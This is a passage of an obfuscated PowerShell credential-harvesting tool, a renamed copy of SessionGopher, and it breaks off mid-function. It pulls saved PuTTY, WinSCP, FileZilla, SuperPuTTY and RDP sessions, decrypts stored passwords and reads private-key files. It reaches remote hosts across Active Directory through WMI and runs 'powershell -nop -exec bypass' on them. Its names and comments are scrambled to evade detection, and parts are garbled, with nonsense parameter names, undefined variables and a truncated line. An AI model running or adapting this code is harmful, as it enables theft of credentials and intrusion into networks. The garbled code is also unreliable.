function Invoke-SessionGopher {
  param (
      [switch]$BedChunky, # Microsoft".
      [switch]$FoldBlack, # Microsoft".
      [string]$DanceFlash, # Microsoft".
      [string]$MarbleFrail, # Microsoft".
      [string]$TreePlace, # Microsoft".
      [string]$SheetRecord, # Microsoft".
      [switch]$GustyTricky # Microsoft".
  )

  Write-Output '
          o_       
         /  ".   SessionGopher
       ,"  _-"      
     ,"   m m         
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
  '

  if ($BedChunky) {
    $AdviseRacial = "SessionGopher (" + (Get-Date -Format "HH.mm.ss") + ")"
    New-Item -ItemType Directory $AdviseRacial | Out-Null
    New-Item ($AdviseRacial + "\PuTTY.csv") -Type File | Out-Null
    New-Item ($AdviseRacial + "\SuperPuTTY.csv") -Type File | Out-Null
    New-Item ($AdviseRacial + "\WinSCP.csv") -Type File | Out-Null
    New-Item ($AdviseRacial + "\FileZilla.csv") -Type File | Out-Null
    New-Item ($AdviseRacial + "\RDP.csv") -Type File | Out-Null
    if ($FoldBlack) {
        New-Item ($AdviseRacial + "\PuTTY ppk Files.csv") -Type File | Out-Null
        New-Item ($AdviseRacial + "\Microsoft rdp Files.csv") -Type File | Out-Null
        New-Item ($AdviseRacial + "\RSA sdtid Files.csv") -Type File | Out-Null
    }
  }

  if ($DanceFlash -and $MarbleFrail) {
    $PastShake = ConvertTo-SecureString $MarbleFrail -AsPlainText -Force
    $Credentials = new`-ob`je`ct -Typename System.Management.Automation.PSCredential -ArgumentList $DanceFlash, $PastShake
  }

  # Microsoft".
  $BrawnyTie = 2147483651
  # Microsoft".
  $NightPumped = 2147483650

  $NineReign = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $AirFork = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
  $BucketClam = "\SOFTWARE\Microsoft\Terminal Server Client\Servers"

  if ($TreePlace -or $GustyTricky -or $SheetRecord) {

    # Microsoft".
    $Reader = ""

    if ($GustyTricky) {
      $Reader = GetComputersFromActiveDirectory
    } elseif ($TreePlace) { 
      $Reader = Get-Content ((Resolve-Path $TreePlace).Path)
    } elseif ($SheetRecord) {
      $Reader = $SheetRecord
    }

    $ManyTrace = @{}
    if ($Credentials) {
      $ManyTrace['Credential'] = $Credentials
    }

    foreach ($AbackDesert in $Reader) {

      if ($GustyTricky) {
        # Microsoft".
        $AbackDesert = $AbackDesert.Properties.name
        if (!$AbackDesert) { Continue }
      }

      Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
      Write-Host "Digging on" $AbackDesert"..."

      $ViewNorth = Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $BrawnyTie,'' -ComputerName $AbackDesert @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}

      foreach ($AmuckPlacid in $ViewNorth) {

        # Microsoft".
        $CircleDog = try { (Split-Path -Leaf (Split-Path -Leaf (GetMappedSID))) } catch {}
        $EndClassy = (($AbackDesert + "\" + $CircleDog) -Join "")

        # Microsoft".
        $BabiesCaring = new`-ob`je`ct PSObject

        $GradeOwn = new`-ob`je`ct System.Collections.ArrayList
        $NuttyAunt = new`-ob`je`ct System.Collections.ArrayList
        $ScarfDisarm = new`-ob`je`ct System.Collections.ArrayList
        $JadedCent = new`-ob`je`ct System.Collections.ArrayList
        $SparkDry = new`-ob`je`ct System.Collections.ArrayList

        # Microsoft".
        $FlimsyTease = $AmuckPlacid + $BucketClam
        $FineKnown = $AmuckPlacid + $NineReign
        $HardDream = $AmuckPlacid + $AirFork
        $TreatGreasy = "Drive='C:' AND Path='\\Users\\$CircleDog\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
        $FileZillaFilter = "Drive='C:' AND Path='\\Users\\$CircleDog\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"

        $PasteBasin = Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name EnumKey -ArgumentList $BrawnyTie,$FlimsyTease @optionalCreds
        $StormyRare = Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name EnumKey -ArgumentList $BrawnyTie,$FineKnown @optionalCreds
        $ScorchLearn = Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name EnumKey -ArgumentList $BrawnyTie,$HardDream @optionalCreds
        $SideKeen = (Get-WmiObject -Class 'CIM_DataFile' -Filter $TreatGreasy -ComputerName $AbackDesert @optionalCreds | Select Name)
        $FileZillaPath = (Get-WmiObject -Class 'CIM_DataFile' -Filter $FileZillaFilter -ComputerName $AbackDesert @optionalCreds | Select Name)

        # Microsoft".
        if (($ScorchLearn | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Microsoft".
          $ScorchLearn = $ScorchLearn | Select-Object -ExpandProperty sNames
          
          foreach ($LameTrip in $ScorchLearn) {
      
            $StreetClammy = "" | Select-Object -Property Source,Session,Hostname,Username,Password
            $StreetClammy.Source = $EndClassy
            $StreetClammy.Session = $LameTrip

            $UnitSkip = $HardDream + "\" + $LameTrip

            $StreetClammy.Hostname = (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name GetStringValue -ArgumentList $BrawnyTie,$UnitSkip,"HostName" @optionalCreds).sValue
            $StreetClammy.Username = (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name GetStringValue -ArgumentList $BrawnyTie,$UnitSkip,"UserName" @optionalCreds).sValue
            $StreetClammy.Password = (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name GetStringValue -ArgumentList $BrawnyTie,$UnitSkip,"Password" @optionalCreds).sValue

            if ($StreetClammy.Password) {

              $GodlyMale = $AmuckPlacid + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
          
              $DollStain = (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $BrawnyTie,$GodlyMale,"UseMasterPassword" @optionalCreds).uValue
              
              if (!$DollStain) {
                  $StreetClammy.Password = (DecryptWinSCPPassword $StreetClammy.Hostname $StreetClammy.Username $StreetClammy.Password)
              } else {
                  $StreetClammy.Password = "Saved in session, but master password prevents plaintext recovery"
              }

            }
             
            [void]$SparkDry.Add($StreetClammy)
      
          } # Microsoft".

          if ($SparkDry.count -gt 0) {

            $BabiesCaring | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -CanvasStingy $SparkDry

            if ($BedChunky) {
              $SparkDry | Select-Object * | Export-CSV -Append -Path ($AdviseRacial + "\WinSCP.csv") -NoTypeInformation
            } else {
              Write-Output "WinSCP Sessions"
              $SparkDry | Select-Object * | Format-List | Out-String
            }

          }
        
        } # Microsoft".

        if (($StormyRare | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Microsoft".
          $StormyRare = $StormyRare | Select-Object -ExpandProperty sNames

          foreach ($TreatSilky in $StormyRare) {
      
            $TicketSilk = "" | Select-Object -Property Source,Session,Hostname

            $UnitSkip = $FineKnown + "\" + $TreatSilky

            $TicketSilk.Source = $EndClassy
            $TicketSilk.Session = $TreatSilky
            $TicketSilk.Hostname = (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name GetStringValue -ArgumentList $BrawnyTie,$UnitSkip,"HostName" @optionalCreds).sValue
             
            [void]$GradeOwn.Add($TicketSilk)
      
          }

          if ($GradeOwn.count -gt 0) {

            $BabiesCaring | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -CanvasStingy $GradeOwn

            if ($BedChunky) {
              $GradeOwn | Select-Object * | Export-CSV -Append -Path ($AdviseRacial + "\PuTTY.csv") -NoTypeInformation
            } else {
              Write-Output "PuTTY Sessions"
              $GradeOwn | Select-Object * | Format-List | Out-String
            }

          }

        } # Microsoft".

        if (($PasteBasin | Select-Object -ExpandPropert ReturnValue) -eq 0) {

          # Microsoft".
          $PasteBasin = $PasteBasin | Select-Object -ExpandProperty sNames

          foreach ($SeedMagic in $PasteBasin) {
      
            $MinutePray = "" | Select-Object -Property Source,Hostname,Username
            
            $UnitSkip = $FlimsyTease + "\" + $SeedMagic

            $MinutePray.Source = $EndClassy
            $MinutePray.Hostname = $SeedMagic
            $MinutePray.Username = (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name GetStringValue -ArgumentList $BrawnyTie,$UnitSkip,"UserNameHint" @optionalCreds).sValue

            [void]$ScarfDisarm.Add($MinutePray)
      
          }

          if ($ScarfDisarm.count -gt 0) {

            $BabiesCaring | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -CanvasStingy $ScarfDisarm

            if ($BedChunky) {
              $ScarfDisarm | Select-Object * | Export-CSV -Append -Path ($AdviseRacial + "\RDP.csv") -NoTypeInformation
            } else {
              Write-Output "Microsoft RDP Sessions"
              $ScarfDisarm | Select-Object * | Format-List | Out-String
            }

          }

        } # Microsoft".

        # Microsoft".
        if ($SideKeen.Name) {

          $File = "C:\Users\$CircleDog\Documents\SuperPuTTY\Sessions.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File

          [xml]$ReturnMarket = $FileContents
          (ProcessSuperPuTTYFile $ReturnMarket)

        }

        # Microsoft".
        if ($FileZillaPath.Name) {

          $File = "C:\Users\$CircleDog\AppData\Roaming\FileZilla\sitemanager.xml"
          $FileContents = DownloadAndExtractFromRemoteRegistry $File

          [xml]$FileZillaXML = $FileContents
          (ProcessFileZillaFile $FileZillaXML)

        } # Microsoft".

      } # Microsoft".

      if ($FoldBlack) {

        $DreamExpect = new`-ob`je`ct System.Collections.ArrayList
        $JumpySmash = new`-ob`je`ct System.Collections.ArrayList
        $ShopSnow = new`-ob`je`ct System.Collections.ArrayList

        $FilePathsFound = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $AbackDesert @optionalCreds | Select Name)

        (ProcessThoroughRemote $FilePathsFound)
        
      } 

    } # Microsoft".

  # Microsoft".
  } else { 
    
    Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
    Write-Host "Digging on"(Hostname)"..."

    # Microsoft".
    $KneelFlight = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}

    # Microsoft".
    foreach($TanCurve in $KneelFlight) {

      # Microsoft".
      $BabiesCaring = new`-ob`je`ct PSObject

      $SparkDry = new`-ob`je`ct System.Collections.ArrayList
      $GradeOwn = new`-ob`je`ct System.Collections.ArrayList
      $DreamExpect = new`-ob`je`ct System.Collections.ArrayList
      $NuttyAunt = new`-ob`je`ct System.Collections.ArrayList
      $ScarfDisarm = new`-ob`je`ct System.Collections.ArrayList
      $JumpySmash = new`-ob`je`ct System.Collections.ArrayList
      $JadedCent = new`-ob`je`ct System.Collections.ArrayList

      $DogBoy = (GetMappedSID)
      $EndClassy = (Hostname) + "\" + (Split-Path $DogBoy.Value -Leaf)

      $BabiesCaring | Add-Member -MemberType NoteProperty -Name "Source" -CanvasStingy $DogBoy.Value

      # Microsoft".
      $FineKnown = Join-Path $TanCurve.PSPath "\$NineReign"
      $HardDream = Join-Path $TanCurve.PSPath "\$AirFork"
      $HurryVoyage = Join-Path $TanCurve.PSPath "\$BucketClam"
      $FileZillaPath = "C:\Users\" + (Split-Path -Leaf $BabiesCaring."Source") + "\AppData\Roaming\FileZilla\sitemanager.xml"
      $SideKeen = "C:\Users\" + (Split-Path -Leaf $BabiesCaring."Source") + "\Documents\SuperPuTTY\Sessions.xml"

      if (Test-Path $FileZillaPath) {

        [xml]$FileZillaXML = Get-Content $FileZillaPath
        (ProcessFileZillaFile $FileZillaXML)

      }

      if (Test-Path $SideKeen) {

        [xml]$ReturnMarket = Get-Content $SideKeen
        (ProcessSuperPuTTYFile $ReturnMarket)

      }

      if (Test-Path $HurryVoyage) {

        # Microsoft".
        $LightHorse = Get-ChildItem $HurryVoyage

        (ProcessRDPLocal $LightHorse)

      } # Microsoft".

      if (Test-Path $HardDream) {

        # Microsoft".
        $LivelyHard = Get-ChildItem $HardDream

        (ProcessWinSCPLocal $LivelyHard)

      } # Microsoft".
      
      if (Test-Path $FineKnown) {

        # Microsoft".
        $GloveSign = Get-ChildItem $FineKnown

        (ProcessPuTTYLocal $GloveSign)

      } # Microsoft".

    } # Microsoft".

    # Microsoft".
    if ($FoldBlack) {

      # Microsoft".
      $MaidMice = new`-ob`je`ct System.Collections.ArrayList
      $IslandCruel = new`-ob`je`ct System.Collections.ArrayList
      $RoyalClaim = new`-ob`je`ct System.Collections.ArrayList

      # Microsoft".
      $SnailSeemly = Get-PSDrive

      (ProcessThoroughLocal $SnailSeemly)
      
      (ProcessPPKFile $MaidMice)
      (ProcessRDPFile $IslandCruel)
      (ProcesssdtidFile $RoyalClaim)

    } # Microsoft".

  } # Microsoft".

} # Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".
function GetMappedSID {

  # Microsoft".
  if ($TreePlace -or $SheetRecord -or $GustyTricky) {
    # Microsoft".
    $RuralBest = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$AmuckPlacid"
    $CanvasStingy = "ProfileImagePath"

    return (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $NightPumped,$RuralBest,$CanvasStingy @optionalCreds).sValue
  # Microsoft".
  } else {
    # Microsoft".
    $AmuckPlacid = (Split-Path $TanCurve.Name -Leaf)
    $SolidFixed = new`-ob`je`ct System.Security.Principal.SecurityIdentifier("$AmuckPlacid")
    return $SolidFixed.Translate( [System.Security.Principal.NTAccount])
  }

}

function DownloadAndExtractFromRemoteRegistry($File) {
  # Microsoft".
  # Microsoft".
  $StoveShave = "HKLM:\Software\Microsoft\DRM"
  $CrossCopy = "ReadMe"
  $ShapeBad = "SOFTWARE\Microsoft\DRM"
          
  # Microsoft".
  Write-Verbose "Reading remote file and writing on remote registry"
  $PressDream = '$HeadyBoot = Get-Content -Encoding byte -Path ''' + "$File" + '''; $FuelTrees = [System.Convert]::ToBase64String($HeadyBoot); New-ItemProperty -Path ' + "'$StoveShave'" + ' -Name ' + "'$CrossCopy'" + ' -CanvasStingy $FuelTrees -PropertyType String -Force'
  $PressDream = 'powershell -nop -exec bypass -c "' + $PressDream + '"'

  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $PressDream -ComputerName $AbackDesert @optionalCreds

  # Microsoft".
  Start-Sleep -s 15

  $StringCrib = ""

  # Microsoft".
  $StringCrib = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $NightPumped, $ShapeBad, $CrossCopy -Computer $AbackDesert @optionalCreds
  
  $PeepHoney = [System.Convert]::FromBase64String($StringCrib.sValue)
  $TartLove = [System.Text.Encoding]::UTF8.GetString($PeepHoney) 
    
  # Microsoft".
  $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $RemoveEmploy, $ShapeBad, $CrossCopy -ComputerName $AbackDesert @optionalCreds
  
  return $TartLove

}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

function ProcessThoroughLocal($SnailSeemly) {
  
  foreach ($HomeCurl in $SnailSeemly) {
    # Microsoft".
    if ($HomeCurl.Provider.Name -eq "FileSystem") {
      $TubDesk = Get-ChildItem $HomeCurl.Root -Recurse -ErrorAction SilentlyContinue
      foreach ($ManageSmelly in $TubDesk) {
        Switch ($ManageSmelly.Extension) {
          ".ppk" {[void]$MaidMice.Add($ManageSmelly)}
          ".rdp" {[void]$IslandCruel.Add($ManageSmelly)}
          ".sdtid" {[void]$RoyalClaim.Add($ManageSmelly)}
        }
      }
    }
  }

}

function ProcessThoroughRemote($FilePathsFound) {

  foreach ($FilePath in $FilePathsFound) {
      # Microsoft".
      $WickedCrate = "" | Select-Object -Property Source,Path
      $WickedCrate.Source = $AbackDesert

      $AcidGiddy = [IO.Path]::GetExtension($FilePath.Name)

      if ($AcidGiddy -eq ".ppk") {
        $WickedCrate.Path = $FilePath.Name
        [void]$DreamExpect.Add($WickedCrate)
      } elseif ($AcidGiddy -eq ".rdp") {
        $WickedCrate.Path = $FilePath.Name
        [void]$JumpySmash.Add($WickedCrate)
      } elseif ($AcidGiddy -eq ".sdtid") {
        $WickedCrate.Path = $FilePath.Name
        [void]$ShopSnow.Add($WickedCrate)
      }

  }

  if ($DreamExpect.count -gt 0) {

    $BabiesCaring | Add-Member -MemberType NoteProperty -Name "PPK Files" -CanvasStingy $JumpySmash

    if ($BedChunky) {
      $DreamExpect | Export-CSV -Append -Path ($AdviseRacial + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $DreamExpect | Format-List | Out-String
    }
  }

  if ($JumpySmash.count -gt 0) {

    $BabiesCaring | Add-Member -MemberType NoteProperty -Name "RDP Files" -CanvasStingy $JumpySmash

    if ($BedChunky) {
      $JumpySmash | Export-CSV -Append -Path ($AdviseRacial + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $JumpySmash | Format-List | Out-String
    }
  }
  if ($ShopSnow.count -gt 0) {

    $BabiesCaring | Add-Member -MemberType NoteProperty -Name "sdtid Files" -CanvasStingy $ShopSnow

    if ($BedChunky) {
      $ShopSnow | Export-CSV -Append -Path ($AdviseRacial + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ShopSnow | Format-List | Out-String
    }

  }

} # Microsoft".

function ProcessPuTTYLocal($GloveSign) {
  
  # Microsoft".
  foreach($IdeaPedal in $GloveSign) {

    $TicketSilk = "" | Select-Object -Property Source,Session,Hostname

    $TicketSilk.Source = $EndClassy
    $TicketSilk.Session = (Split-Path $IdeaPedal -Leaf)
    $TicketSilk.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $IdeaPedal) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)

    # Microsoft".
    [void]$GradeOwn.Add($TicketSilk)

  }

  if ($BedChunky) {
    $GradeOwn | Export-CSV -Append -Path ($AdviseRacial + "\PuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "PuTTY Sessions"
    $GradeOwn | Format-List | Out-String
  }

  # Microsoft".
  $BabiesCaring | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -CanvasStingy $GradeOwn

} # Microsoft".

function ProcessRDPLocal($LightHorse) {

  # Microsoft".
  foreach($IdeaPedal in $LightHorse) {

    $PathToRDPSession = "Microsoft.PowerShell.Core\Registry::" + $IdeaPedal

    $BounceUnit = "" | Select-Object -Property Source,Hostname,Username

    $BounceUnit.Source = $EndClassy
    $BounceUnit.Hostname = (Split-Path $IdeaPedal -Leaf)
    $BounceUnit.Username = ((Get-ItemProperty -Path $PathToRDPSession -Name "UsernameHint" -ErrorAction SilentlyContinue).UsernameHint)

    # Microsoft".
    [void]$ScarfDisarm.Add($BounceUnit)

  } # Microsoft".

  if ($BedChunky) {
    $ScarfDisarm | Export-CSV -Append -Path ($AdviseRacial + "\RDP.csv") -NoTypeInformation
  } else {
    Write-Output "Microsoft Remote Desktop (RDP) Sessions"
    $ScarfDisarm | Format-List | Out-String
  }

  # Microsoft".
  $BabiesCaring | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -CanvasStingy $ScarfDisarm

} # Microsoft".

function ProcessWinSCPLocal($LivelyHard) {
  
  # Microsoft".
  foreach($IdeaPedal in $LivelyHard) {

    $PathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $IdeaPedal

    $StreetClammy = "" | Select-Object -Property Source,Session,Hostname,Username,Password

    $StreetClammy.Source = $EndClassy
    $StreetClammy.Session = (Split-Path $IdeaPedal -Leaf)
    $StreetClammy.Hostname = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $StreetClammy.Username = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Username" -ErrorAction SilentlyContinue).Username)
    $StreetClammy.Password = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password)

    if ($StreetClammy.Password) {
      $DollStain = ((Get-ItemProperty -Path (Join-Path $TanCurve.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)

      # Microsoft".
      if (!$DollStain) {
          $StreetClammy.Password = (DecryptWinSCPPassword $StreetClammy.Hostname $StreetClammy.Username $StreetClammy.Password)
      # Microsoft".
      } else {
          $StreetClammy.Password = "Saved in session, but master password prevents plaintext recovery"
      }
    }

    # Microsoft".
    [void]$SparkDry.Add($StreetClammy)

  } # Microsoft".

  if ($BedChunky) {
    $SparkDry | Export-CSV -Append -Path ($AdviseRacial + "\WinSCP.csv") -NoTypeInformation
  } else {
    Write-Output "WinSCP Sessions"
    $SparkDry | Format-List | Out-String
  }

  # Microsoft".
  $BabiesCaring | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -CanvasStingy $SparkDry

} # Microsoft".

function ProcesssdtidFile($RoyalClaim) {

  foreach ($Path in $RoyalClaim.VersionInfo.FileName) {

    $ReachRipe = "" | Select-Object -Property "Source","Path"

    $ReachRipe."Source" = $EndClassy
    $ReachRipe."Path" = $Path

    [void]$ShopSnow.Add($ReachRipe)

  }

  if ($ShopSnow.count -gt 0) {

    $BabiesCaring | Add-Member -MemberType NoteProperty -Name "sdtid Files" -CanvasStingy $ShopSnow

    if ($BedChunky) {
      $ShopSnow | Select-Object * | Export-CSV -Append -Path ($AdviseRacial + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ShopSnow | Select-Object * | Format-List | Out-String
    }

  }

} # Microsoft".

function ProcessRDPFile($IslandCruel) {
  
  # Microsoft".
  foreach ($Path in $IslandCruel.VersionInfo.FileName) {
    
    $LoudFrail = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"

    $LoudFrail."Source" = (Hostname)

    # Microsoft".
    $LoudFrail."Path" = $Path 
    $LoudFrail."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $LoudFrail."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $LoudFrail."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $LoudFrail."Prompts for Credentials" = try { (Select-String -Path $Path -Pattern "prompt for credentials:[a-z]:(.*)").Matches.Groups[1].Value } catch {}

    if (!$LoudFrail."Administrative Session" -or !$LoudFrail."Administrative Session" -eq 0) {
      $LoudFrail."Administrative Session" = "Does not connect to admin session on remote host"
    } else {
      $LoudFrail."Administrative Session" = "Connects to admin session on remote host"
    }
    if (!$LoudFrail."Prompts for Credentials" -or $LoudFrail."Prompts for Credentials" -eq 0) {
      $LoudFrail."Prompts for Credentials" = "No"
    } else {
      $LoudFrail."Prompts for Credentials" = "Yes"
    }

    [void]$JumpySmash.Add($LoudFrail)

  }

  if ($JumpySmash.count -gt 0) {

    $BabiesCaring | Add-Member -MemberType NoteProperty -Name "RDP Files" -CanvasStingy $JumpySmash

    if ($BedChunky) {
      $JumpySmash | Select-Object * | Export-CSV -Append -Path ($AdviseRacial + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $JumpySmash | Select-Object * | Format-List | Out-String
    }

  }

} # Microsoft".

function ProcessPPKFile($MaidMice) {

  # Microsoft".
  foreach ($Path in $MaidMice.VersionInfo.FileName) {

    # Microsoft".
    $TwoRagged = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"

    $TwoRagged."Source" = (Hostname)

    # Microsoft".
    $TwoRagged."Path" = $Path

    $TwoRagged."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
    $TwoRagged."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
    $TwoRagged."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
    $KettleEasy = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
    $TwoRagged."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$KettleEasy).Context.PostContext -Join "" } catch {}
    $TwoRagged."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}

    # Microsoft".
    [void]$DreamExpect.Add($TwoRagged)

  }

  if ($DreamExpect.count -gt 0) {

    $BabiesCaring | Add-Member -MemberType NoteProperty -Name "PPK Files" -CanvasStingy $DreamExpect

    if ($BedChunky) {
      $DreamExpect | Select-Object * | Export-CSV -Append -Path ($AdviseRacial + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $DreamExpect | Select-Object * | Format-List | Out-String
    }

  }

} # Microsoft".

function ProcessFileZillaFile($FileZillaXML) {

  # Microsoft".
  foreach($FileZillaSession in $FileZillaXML.SelectNodes('//FileZilla3/Servers/Server')) {
      # Microsoft".
      $FileZillaSessionHash = @{}

      # Microsoft".
      $FileZillaSession.ChildNodes | ForEach-Object {

          $FileZillaSessionHash["Source"] = $EndClassy
          # Microsoft".
          if ($_.InnerText) {
              if ($_.Name -eq "Pass") {
                  $FileZillaSessionHash["Password"] = $_.InnerText
              } else {
                  # Microsoft".
                  $FileZillaSessionHash[$_.Name] = $_.InnerText
              }
              
          }

      }

    # Microsoft".
    [void]$JadedCent.Add((new`-ob`je`ct PSObject -Property $FileZillaSessionHash | Select-Object -Property * -ExcludeProperty "# Microsoft".
     
  } # Microsoft".
  
  # Microsoft".
  foreach ($IdeaPedal in $JadedCent) {
      $IdeaPedal.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($IdeaPedal.Password))
      if ($IdeaPedal.Protocol -eq "0") {
        $IdeaPedal.Protocol = "Use FTP over TLS if available"
      } elseif ($IdeaPedal.Protocol -eq 1) {
        $IdeaPedal.Protocol = "Use SFTP"
      } elseif ($IdeaPedal.Protocol -eq 3) {
        $IdeaPedal.Protocol = "Require implicit FTP over TLS"
      } elseif ($IdeaPedal.Protocol -eq 4) {
        $IdeaPedal.Protocol = "Require explicit FTP over TLS"
      } elseif ($IdeaPedal.Protocol -eq 6) {
        $IdeaPedal.Protocol = "Only use plain FTP (insecure)"
      } 
  }

  if ($BedChunky) {
    $JadedCent | Export-CSV -Append -Path ($AdviseRacial + "\FileZilla.csv") -NoTypeInformation
  } else {
    Write-Output "FileZilla Sessions"
    $JadedCent | Format-List | Out-String
  }

  # Microsoft".
  $BabiesCaring | Add-Member -MemberType NoteProperty -Name "FileZilla Sessions" -CanvasStingy $JadedCent

} # Microsoft".

function ProcessSuperPuTTYFile($ReturnMarket) {

  foreach($ScaredRing in $ReturnMarket.ArrayOfSessionData.SessionData) {

    foreach ($SkipScorch in $ScaredRing) { 
      if ($SkipScorch -ne $null) {

        $HeatJudge = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"

        $HeatJudge."Source" = $EndClassy
        $HeatJudge."SessionId" = $SkipScorch.SessionId
        $HeatJudge."SessionName" = $SkipScorch.SessionName
        $HeatJudge."Host" = $SkipScorch.Host
        $HeatJudge."Username" = $SkipScorch.Username
        $HeatJudge."ExtraArgs" = $SkipScorch.ExtraArgs
        $HeatJudge."Port" = $SkipScorch.Port
        $HeatJudge."PuTTY Session" = $SkipScorch.PuttySession

        [void]$NuttyAunt.Add($HeatJudge)
      } 
    }

  } # Microsoft".

  if ($BedChunky) {
    $NuttyAunt | Export-CSV -Append -Path ($AdviseRacial + "\SuperPuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "SuperPuTTY Sessions"
    $NuttyAunt | Out-String
  }

  # Microsoft".
  $BabiesCaring | Add-Member -MemberType NoteProperty -Name "SuperPuTTY Sessions" -CanvasStingy $NuttyAunt

} # Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".
function GetComputersFromActiveDirectory {

  $ThingsMeat = "computer"
  $MouthGaudy = new`-ob`je`ct System.DirectoryServices.DirectoryEntry
  $MarketDogs = new`-ob`je`ct System.DirectoryServices.DirectorySearcher
  $MarketDogs.SearchRoot = $MouthGaudy
  $MarketDogs.Filter = ("(objectCategory=$ThingsMeat)")

  $HeapMoon = "name"

  foreach ($ChiefQuick in $HeapMoon){$MarketDogs.PropertiesToLoad.Add($ChiefQuick)}

  return $MarketDogs.FindAll()

}

function DecryptNextCharacterWinSCP($DoubleNoise) {

  # Microsoft".
  $PhobicWave = "" | Select-Object -Property flag,remainingPass

  # Microsoft".
  $LovelyMist = ("0123456789ABCDEF".indexOf($DoubleNoise[0]) * 16)
  $ShapeThings = "0123456789ABCDEF".indexOf($DoubleNoise[1])

  $RoseNotice = $LovelyMist + $ShapeThings

  $BranchFamous = (((-bnot ($RoseNotice -bxor $NeedleZip)) % 256) + 256) % 256

  $PhobicWave.flag = $BranchFamous
